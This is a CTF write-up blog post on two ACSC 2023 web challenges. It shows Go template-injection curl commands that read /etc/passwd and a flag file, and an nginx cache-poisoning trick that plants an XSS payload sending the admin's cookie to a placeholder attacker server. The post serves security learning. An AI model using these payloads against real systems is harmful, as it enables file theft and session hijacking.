<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>ACSC 2023 Quals (I): Gotion and easySSTI :: Mystify</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Asian Cyber Security Challenge (ACSC) is an annual CTF where players are competing individually, and the best young Asians will be selected form a team to represent Asia to compete with others. I ended up winning the competition among 450&#43; players. Unfortunately, I am unable to qualify because of the age and nationality conditions.
In this blog post, I will cover two web challenges, @t0nk42&amp;rsquo;s easySSTI (43 solves) and @tyage&amp;rsquo;s Gotion (9 solves)." />
<meta name="keywords" content="ctf" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://mystiz.hk/posts/2023/2023-03-29-acsc-1/" />




<link rel="stylesheet" href="https://mystiz.hk/assets/style.css">

  <link rel="stylesheet" href="https://mystiz.hk/assets/mystiz.css">






<link rel="apple-touch-icon" href="https://mystiz.hk/img/apple-touch-icon-192x192.png">

  <link rel="shortcut icon" href="https://mystiz.hk/img/favicon/mystiz.png">





<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://mystiz.hk/images/2023-03-29-acsc/banner.png" />


  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="mystiz613" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="ACSC 2023 Quals (I): Gotion and easySSTI">
<meta property="og:description" content="Asian Cyber Security Challenge (ACSC) is an annual CTF where players are competing individually, and the best young Asians will be selected form a team to represent Asia to compete with others. I ended up winning the competition among 450&#43; players. Unfortunately, I am unable to qualify because of the age and nationality conditions.

In this blog post, I will cover two web challenges, @t0nk42’s easySSTI (43 solves) and @tyage’s Gotion (9 solves)." />
<meta property="og:url" content="https://mystiz.hk/posts/2023/2023-03-29-acsc-1/" />
<meta property="og:site_name" content="Mystify" />

  <meta property="og:image" content="https://mystiz.hk/images/2023-03-29-acsc/banner.png">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2023-03-29 00:50:00 &#43;0800 &#43;0800" />












  <script data-ad-client="ca-pub-3220069814773012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>


</head>
<body class="mystiz">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Mystify
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about-me">About Me</a></li>
        
      
        
          <li><a href="/blogroll">Blogroll</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about-me">About Me</a></li>
      
    
      
        <li><a href="/blogroll">Blogroll</a></li>
      
    
      
        <li><a href="/crypto-in-ctf">Crypto in CTF</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://mystiz.hk/posts/2023/2023-03-29-acsc-1/">ACSC 2023 Quals (I): Gotion and easySSTI</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2023-03-29 
      </span>
    
    
    <span class="post-author">:: Mystiz</span>
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://mystiz.hk/tags/ctf/">ctf</a>&nbsp;
    
    #<a href="https://mystiz.hk/tags/acsc/">acsc</a>&nbsp;
    
    #<a href="https://mystiz.hk/tags/web/">web</a>&nbsp;
    
  </span>
  

  
  <h6 class="post-subtitle">Hacking two Golang web apps with template injection and cache poisoning.</h6>
  

  
    <img src="https://mystiz.hk/images/2023-03-29-acsc/banner.png" class="post-cover center" alt="ACSC 2023 Quals (I): Gotion and easySSTI" />
  

  <div class="post-content js-toc-content"><div>
        <p>Asian Cyber Security Challenge (ACSC) is an annual CTF where players are competing individually, and the best young Asians will be selected form a team to represent Asia to compete with others. I ended up winning the competition among 450+ players. Unfortunately, I am unable to qualify because of the age and nationality conditions.</p>
<p>In this blog post, I will cover two web challenges, <a href="https://twitter.com/t0nk42" target="_blank" rel="nofollow">@t0nk42</a>&rsquo;s <em>easySSTI</em> (43 solves) and <a href="https://twitter.com/tyage" target="_blank" rel="nofollow">@tyage</a>&rsquo;s <em>Gotion</em> (9 solves).</p>
<h2 id="easyssti">easySSTI<a href="#easyssti" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>We are given a web app written with the <em>Echo</em> framework in <em>Golang</em>, which renders the content given a template string in the <code>Template</code> header. For instance, setting the <code>Template</code> header by <code>{{ .Request.RemoteAddr }}</code> would show <code>172.0.0.1:31337</code>.</p>
<p>However, the application is served behind a firewall (WAF) that drops all the HTTP responses containing the flag format (i.e., <code>ACSC{.*}</code>).</p>
<p>The goal is to read the flag.</p>
<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="part-i-understanding-the-challenge">Part I: Understanding the challenge<a href="#part-i-understanding-the-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>To start with, we may want to understand why <code>{{ .Request.RemoteAddr }}</code> prints the IP address. The below code snippet is the <code>handleIndex</code> function, which handles <code>GET /</code>. I commented the function for ease of reading.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">handleIndex</span>(<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">echo</span>.<span style="color:#a6e22e">Context</span>) <span style="color:#66d9ef">error</span> {
    <span style="color:#75715e">// Reads the template. This either comes from the &#34;Template&#34; header user
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// supplied, or a default value otherwise. The value is defined by a
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// middleware which is not included here.
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">tmpl</span>, <span style="color:#a6e22e">ok</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">Get</span>(<span style="color:#e6db74">&#34;template&#34;</span>).([]<span style="color:#66d9ef">byte</span>)

    <span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">ok</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;failed to get template&#34;</span>)
    }

    <span style="color:#a6e22e">tmplStr</span> <span style="color:#f92672">:=</span> string(<span style="color:#a6e22e">tmpl</span>)

    <span style="color:#75715e">// The `Parse` function converts a string into a template.Template instance.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Reference: https://pkg.go.dev/html/template#Template.Parse
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">template</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;page&#34;</span>).<span style="color:#a6e22e">Parse</span>(<span style="color:#a6e22e">tmplStr</span>)
    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
    }

    <span style="color:#a6e22e">buf</span> <span style="color:#f92672">:=</span> new(<span style="color:#a6e22e">bytes</span>.<span style="color:#a6e22e">Buffer</span>)

    <span style="color:#75715e">// The `Execute` function applies the given template to the data object
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// (which is `c` in our case) and sets the results to `buf`.
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Reference: https://pkg.go.dev/html/template#Template.Execute
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">Execute</span>(<span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">c</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
    }

    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">HTML</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">String</span>())
}
</code></pre></div><p>Here <code>c</code> is an <a href="https://github.com/labstack/echo/blob/v4.10.0/context.go#L19-L198"><code>echo.Context</code></a>, which is an interface with several methods. In the example, it uses the <code>Request()</code> method which returns a pointer of a <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.19:src/net/http/request.go;l=103-324"><code>http.Request</code></a>. It has a field called <code>RemoteAddr</code>.</p>
<p>In our example, we can imagine that <code>{{ .Request.RemoteAddr }}</code> behaves the same as evaluating <code>c.Request().RemoteAddr</code> and printing the results.</p>
<h4 id="part-ii-an-invalid-trivial-solution">Part II: An invalid trivial solution<a href="#part-ii-an-invalid-trivial-solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>There is a <code>File</code> function from <code>echo.Context</code> that allows us to read an arbitrary file. For instance, we can access the content of <code>/etc/passwd</code> with the template being <code>{{ .File &quot;/etc/passwd&quot; }}</code>:</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='2-20' data-user='mystiz' data-host='fixa'>
<code class="language-bash">curl &#39;http://localhost:8000/&#39; -H &#39;template: {{ .File &#34;/etc/passwd&#34; }}&#39; 
root:​x:0:0:root:/root:/bin/bash
daemon:​x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:​x:2:2:bin:/bin:/usr/sbin/nologin
sys:​x:3:3:sys:/dev:/usr/sbin/nologin
sync:​x:4:65534:sync:/bin:/bin/sync
games:​x:5:60:games:/usr/games:/usr/sbin/nologin
man:​x:6:12:​man:/var/cache/man:/usr/sbin/nologin
lp:​x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:​x:8:8:mail:/var/mail:/usr/sbin/nologin
news:​x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:​x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:​x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:​x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:​x:34:34:backup:/var/backups:/usr/sbin/nologin
list:​x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:​x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:​x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:​x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:​x:​100:65534::/nonexistent:/usr/sbin/nologin</code>
</pre>
</div>
<p>Of course, we cannot read <code>/flag</code> because it is blocked by the firewall:</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='2' data-user='mystiz' data-host='fixa'>
<code class="language-bash">curl &#39;http://localhost:8000/&#39; -H &#39;template: {{ .File &#34;/flag&#34; }}&#39; 
??</code>
</pre>
</div>
<p>Unfortunately, the <code>File</code> function does not return the file content as a string. The content is instead served directly (see lines <a href="https://github.com/labstack/echo/blob/v4.10.0/context_fs.go#L11-L13">11-13</a> and <a href="https://github.com/labstack/echo/blob/v4.10.0/context_fs.go#L24-L49">24-49</a> of <code>context_fs.go</code>). Thus we cannot manipulate the output via variables (or pipelines) like below:</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
    -H &#39;template: {{ with $x := &#34;ACSC{this_is_a_test_flag}&#34; }}{{ slice $x 1 }}{{ end }}&#39;
CSC{this_is_a_test_flag}</code>
</pre>
</div>
<h4 id="part-iii-embedding-or-golangs-inheritancegolang-embedding">Part III: Embedding, or Golang&rsquo;s inheritance<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><a href="#part-iii-embedding-or-golangs-inheritancegolang-embedding" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>We can get an instance of the <a href="https://github.com/labstack/echo/blob/v4.10.0/echo.go#L68-L106"><code>echo.Echo</code></a> struct by accessing <code>{{ .Echo }}</code>. Note that it embeds two structs, <a href="https://github.com/labstack/echo/blob/v4.10.0/echo_fs.go#L13-L21"><code>echo.filesystem</code></a> and <code>echo.common</code>. Therefore we have access to their methods and attributes. In particular, we have the <code>Filesystem</code> instance (which is a <a href="https://pkg.go.dev/io/fs#FS"><code>fs.FS</code></a>). Now we can open a file with the <code>Open</code> method provided:</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
    -H &#39;template: {{ .Echo.Filesystem.Open &#34;/etc/passwd&#34; }}&#39;
{0xc0001a1bc0}</code>
</pre>
</div>
<p>The <code>{0xc0001a1bc0}</code> returned is actually a <a href="https://pkg.go.dev/io/fs#File"><code>fs.File</code></a>, which has a <code>Read</code> function. The signature of the function is <code>Read([]byte) (int, error)</code>, and we need to give it an <code>[]byte</code> to overwrite. Fortunately, the template itself is a <code>[]byte</code>, and we can access it with <code>{{ .Get &quot;template&quot; }}</code>.</p>
<p>Chaining it together, we can read the flag &ndash; <code>ACSC{h0w_did_y0u_leak_me}</code>:</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='3' data-user='mystiz' data-host='fixa'>
<code class="language-bash">curl &#39;http://localhost:8000/&#39; \
    -H &#39;template: {{ $y := .Get &#34;template&#34; }}{{ $x := .Echo.Filesystem.Open &#34;/flag&#34; }}{{ $z := $x.Read $y }}{{ $y }}&#39;
[65 67 83 67 123 104 48 119 95 100 105 100 95 121 48 117 95 108 101 97 107 95 109 101 125 10 125 123 123 32 36 120 32 58 61 32 46 69 99 104 111 46 70 105 108 101 115 121 115 116 101 109 46 79 112 101 110 32 34 47 102 108 97 103 34 32 125 125 123 123 32 36 122 32 58 61 32 36 120 46 82 101 97 100 32 36 121 32 125 125 123 123 32 36 121 32 125 125]</code>
</pre>
</div>
<p>There are four actions in the above template:</p>
<ol>
<li><code>{{ $y := .Get &quot;template&quot; }}</code> reads the template and assigns it to <code>$y</code>,</li>
<li><code>{{ $x := .Echo.FileSystem.Open &quot;/flag&quot; }}</code> opens <code>/flag</code> and assigns the instance of <a href="https://pkg.go.dev/io/fs#File"><code>fs.File</code></a> to <code>$x</code>,</li>
<li><code>{{ $z := $x.Read $y }}</code> reads the content of <code>/flag</code> and writes to <code>$y</code>, and</li>
<li><code>{{ $y }}</code> prints the value of <code>$y</code>, where the flag is overwritten.</li>
</ol>
<div class="alert info">
  🐣 <strong>Why <code>$z := $x.Read $y</code>?</strong> Here <code>$z := </code> is used to surpress the return value of <code>Read($y)</code> to be printed. In this case, it would be an integer.
</div>

<h2 id="gotion">Gotion<a href="#gotion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>We are given another web app written in <em>Golang</em> implementing a note system. We are allowed to create and update notes. The content (including both the title and the body) will be handled by the <code>html/template</code> package to avoid injections like XSS. Additionally, the web app is served behind <em>nginx</em> with a smart caching feature, which caches <code>.mp4</code> files.</p>
<p>The goal is to create a XSS to steal the admin&rsquo;s cookie.</p>
<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="part-i-sussy-nginx-configuration">Part I: Sussy nginx configuration<a href="#part-i-sussy-nginx-configuration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The configuration of <em>nginx</em> is given to us:</p>
<pre tabindex="0"><code class="language-conf" data-lang="conf">proxy_cache_path /tmp/nginx keys_zone=mycache:10m;
server {
    listen 80;

    location ~ .mp4$ {
        # Smart and Efficient Byte-Range Caching with NGINX
        # https://www.nginx.com/blog/smart-efficient-byte-range-caching-nginx/
        proxy_cache mycache;
        slice              4096; # Maybe it should be bigger?
        proxy_cache_key    $host$uri$is_args$args$slice_range;
        # $is_args = '?' if there are arguments, and $is_args = '' otherwise
        # $args are the GET parameters, e.g. ?foo=bar
        # $slice_range, for example, could be &quot;bytes=0-4095&quot;
        proxy_set_header   Range $slice_range;
        proxy_http_version 1.1;
        proxy_cache_valid  200 206 1h;
        proxy_pass http://app:3000;
    }

    location / {
        proxy_pass http://app:3000;
    }
}
</code></pre><p>When I read the configuration file, <code>.mp4$</code> has caught my attention. From the use of <code>$</code>, it is supposed to be a regular expression. In that case <code>.</code> would be a wildcard. Thus, paths ending with <code>[WHATEVER]mp4</code> (instead of <code>.mp4</code>) would be cached.</p>
<p>We can create a note titled <code>mp4</code> (the path generated would be <code>/notes/[UUID]-mp4</code>) to verify the caching behaviour. For instance, we can see that a cache file is created under <code>/tmp/nginx</code>, with cache key being <code>localhost/notes/[UUID]-mp4bytes=0-4095</code>:</p>

  <figure class="center" >
    <img src="/images/2023-03-29-acsc/gotion-mp4-cached.png"   />
    
  </figure>


<p>If we create a large enough note (for instance, if we set the body to be 1024 <code>&amp;</code>s, then the response would end up ~13 kB). In that case, the response will be cached into four parts: $[0, 4096)$, $[4096, 8192)$, $[8192, 12288)$ and $[12288, 16384)$.</p>



<div class="code-toolbar">
<pre class='language-bash command-line' data-output='2-8, 10-20, 22-32, 34-44, 46-56' data-user='mystiz' data-host='fixa'>
<code class="language-bash">ls -al /tmp/nginx
total 36
drwx------ 2 nginx root  4096 Mar 28 15:20 .
drwxrwxrwt 1 root  root  4096 Mar 28 15:21 ..
-rw------- 1 nginx nginx 4768 Mar 28 15:20 3d9b2fdc36fefca75ea9cff6c01f171c
-rw------- 1 nginx nginx 4760 Mar 28 15:20 6a6f810a210e00434094f6110e74dd9e
-rw------- 1 nginx nginx 4766 Mar 28 15:20 dd674b8be2b1b457d437487bd125d57b
-rw------- 1 nginx nginx  879 Mar 28 15:20 ea5c57612df19a2c0bd7a4880fa46c18
hd /tmp/nginx/6a6f810a210e00434094f6110e74dd9e | head -n 11
00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
00000030  34 c3 61 18 00 00 9b 01  98 02 00 00 00 00 00 00  |4.a.............|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
00000190  74 65 73 3d 30 2d 34 30  39 35 0a 48 54 54 50 2f  |tes=0-4095.HTTP/|
hd /tmp/nginx/dd674b8be2b1b457d437487bd125d57b | head -n 11
00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
00000030  96 5d 64 16 00 00 9e 01  9e 02 00 00 00 00 00 00  |.]d.............|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
00000190  74 65 73 3d 34 30 39 36  2d 38 31 39 31 0a 48 54  |tes=4096-8191.HT|
hd /tmp/nginx/3d9b2fdc36fefca75ea9cff6c01f171c | head -n 11
00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
00000030  47 51 ff 48 00 00 9f 01  a0 02 00 00 00 00 00 00  |GQ.H............|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
00000190  74 65 73 3d 38 31 39 32  2d 31 32 32 38 37 0a 48  |tes=8192-12287.H|
hd /tmp/nginx/ea5c57612df19a2c0bd7a4880fa46c18 | head -n 11
00000000  05 00 00 00 00 00 00 00  c8 13 23 64 00 00 00 00  |..........#d....|
00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  cb ec 1f 64 00 00 00 00  b8 05 23 64 00 00 00 00  |...d......#d....|
00000030  4a cd 30 04 00 00 a0 01  a1 02 00 00 00 00 00 00  |J.0.............|
00000040  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00000150  0a 4b 45 59 3a 20 6c 6f  63 61 6c 68 6f 73 74 2f  |.KEY: localhost/|
00000160  6e 6f 74 65 73 2f 65 34  64 38 39 31 66 30 2d 30  |notes/e4d891f0-0|
00000170  32 63 62 2d 34 65 38 62  2d 38 33 62 65 2d 35 34  |2cb-4e8b-83be-54|
00000180  37 65 30 61 66 63 63 64  32 32 2d 6d 70 34 62 79  |7e0afccd22-mp4by|
00000190  74 65 73 3d 31 32 32 38  38 2d 31 36 33 38 33 0a  |tes=12288-16383.|</code>
</pre>
</div>
<p>In particular, we can selectively cache part of the HTTP response using the <code>Range</code> header. For instance, we can only cache bytes $[4096, 8192)$ using</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl http://localhost:30080/notes/<span style="color:#f92672">[</span>UUID<span style="color:#f92672">]</span>-mp4 -H <span style="color:#e6db74">&#39;Range: bytes=4096-4096&#39;</span>
</code></pre></div><h4 id="part-ii-caching-the-xss-payload">Part II: Caching the XSS payload<a href="#part-ii-caching-the-xss-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><a href="https://pkg.go.dev/html/template"><code>html/template</code></a> sanitizes the user input properly. For example, <code>&lt;</code> would be replaced to <code>&amp;lt;</code>. If we want to start a HTML tag (i.e., getting a <code>&lt;</code>), we have to use the one existed in the template.</p>
<p>The below HTML snippet is the first 4096 bytes if we set the title to be <code>mp4</code> and the body to be <code>&amp;&amp;&amp;...&amp;&gt;</code> (622 <code>&amp;</code>&rsquo;s). In particular, the last byte is a <code>&lt;</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;

&lt;<span style="color:#f92672">head</span>&gt;
  [...SNIPPED...]
&lt;/<span style="color:#f92672">head</span>&gt;

&lt;<span style="color:#f92672">body</span>&gt;

  &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;container&#34;</span>&gt;
    &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card mt-5&#34;</span>&gt;
      &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-body&#34;</span>&gt;
        &lt;<span style="color:#f92672">h4</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;card-title&#34;</span>&gt;mp4&lt;/<span style="color:#f92672">h4</span>&gt;
        &lt;<span style="color:#f92672">pre</span>&gt;&amp;amp;&amp;amp;&amp;amp; [...SNIPPED...] &amp;amp;&amp;amp;&amp;amp;&amp;gt;<span style="color:#960050;background-color:#1e0010">&lt;</span>
</code></pre></div><p>On the other hand, if we set the body to</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">&amp;&amp;&amp;...&amp;img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=x 
</code></pre></div><p>The bytes in $[4096, 8192)$ in the HTTP response would be</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">img onerror=window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}` src=x &lt;/<span style="color:#f92672">pre</span>&gt;
      &lt;/<span style="color:#f92672">div</span>&gt;
    &lt;/<span style="color:#f92672">div</span>&gt;

    &lt;<span style="color:#f92672">div</span>&gt;
      &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-link&#34;</span> <span style="color:#a6e22e">data-bs-toggle</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;collapse&#34;</span> <span style="color:#a6e22e">data-bs-target</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#editNote&#34;</span>&gt;
        Edit
      &lt;/<span style="color:#f92672">button</span>&gt;
      &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/report&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;report&#34;</span>&gt;
        &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hidden&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;path&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;notes/[UUID]-mp4&#34;</span>&gt;
        &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;g-recaptcha btn btn-link&#34;</span> <span style="color:#a6e22e">data-sitekey</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">data-callback</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;onReport&#34;</span>
          <span style="color:#a6e22e">data-action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>&gt;Report&lt;/<span style="color:#f92672">button</span>&gt;
      &lt;/<span style="color:#f92672">form</span>&gt;
    &lt;/<span style="color:#f92672">div</span>&gt;

    [...SNIPPED...]
</code></pre></div><p>If we concatenate the responses, we can see that there is an image tag in between:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">window.location=`http://MY_SECRET_SERVER:4444/2?${document.cookie}`</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#960050;background-color:#1e0010">&lt;/</span><span style="color:#a6e22e">pre</span>&gt;
</code></pre></div><p>The image tag would be rendered if we cache the two responses individually. Now we can report it to the admins and get their cookies stolen:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">ACSC{character_appears_at_the_last_of_video_is_shobon_not_amongus}
